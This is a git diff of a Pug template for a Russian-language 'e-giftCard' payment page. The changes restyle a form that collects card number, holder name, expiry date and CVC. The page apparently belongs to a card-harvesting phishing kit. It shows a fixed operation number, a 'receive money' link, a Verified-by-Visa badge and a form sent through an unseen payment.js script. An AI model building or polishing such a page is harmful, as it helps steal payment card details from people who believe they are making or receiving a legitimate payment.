@@ -4,13 +4,13 @@ block content
     link(href="https://unpkg.com/material-components-web@latest/dist/material-components-web.min.css" rel="stylesheet")
     link(rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons")
     script(src="/javascripts/jquery.card.js")
-    .block-section.block.bg-gray.w-100
-        .html-header
+    .block-section.block.w-100
+        .html-header#header
           .html-header-topside
               .topside-left
                 span.lang_change
               .topside-brand-logo
-                img(src="./../images/logo.png" alt="" class="logo")
+                img(src="./../images/logo2.png" alt="" class="logo")
               .topside-right
                 span.topside-span support@e-giftCard.org
           .html-header-backside
@@ -21,21 +21,44 @@ block content
                 a(href="/#get" class="li-item") Получить деньги
               li.ul-nav-li
                 a(href="/#faq" class="li-item") Как работает
-    .info-block
-      p Номер операции: 00063309
-      p Сумма платежа: #{value},00 $
-      p Продавец: ООО "e-giftCard"
-      p Введите данные для оплаты и нажмите "Продолжить", после чего вы будете переведены на страницу подтверждения платежа.
-    .payment-block
-      .card-wrapper
-      form#payment
-        input(type="text" name="number" placeholder='**** **** **** ****')
-        input(type="text" name="name" placeholder='ФАМИЛИЯ ИМЯ')
-        input(type="text" name="expiry" placeholder='xx / xxxx')
-        input(type="text" name="cvc" placeholder='CVC')
-        button(type='submit')
-          span.material-icons lock
-          div Оплатить
-      img(src='/images/vbf.png').vbv-image
+    .main_content_wrapper
+      .info-block_wrapper
+        .info_block
+          .p_stack
+            p 
+              b Номер операции:
+              |  00063309
+            p 
+              b Сумма платежа: 
+              |  #{value},00 $
+            p 
+              b Продавец:
+              |  ООО "e-giftCard"
+            p.text_silence Введите данные для оплаты и нажмите 
+              i "Оплатить"
+              | , после чего вы будете переведены на страницу подтверждения платежа.
+        .img_wrapper
+          img.services(src="/images/boshki.png")
+      .payment-block
+        .card-wrapper
+        .form_wrapper
+          form#payment
+            .form_block
+              label.form_label(for="id1") Номер карты
+              input(type="text" name="number" placeholder='**** **** **** ****' required).form_input#id1
+            .form_block
+              label.form_label Владелец карты
+              input(type="text" name="name" placeholder='ФАМИЛИЯ ИМЯ' required).form_input
+            .form_block              
+              label.form_label Срок окончания 
+              input(type="text" name="expiry" placeholder='xx / xxxx' required).form_input
+            .form_block
+              label.form_label CVC - код
+              input(type="text" name="cvc" placeholder='CVC' required).form_input
+            button(type='submit').btn.form_btn.btn_main
+              i.fa.fa-lock.g
+              span Оплатить
+            img(src='/images/vbf.png').vbv_image
+              
     script(src='/javascripts/payment.js')
     script(src="https://unpkg.com/material-components-web@latest/dist/material-components-web.min.js")
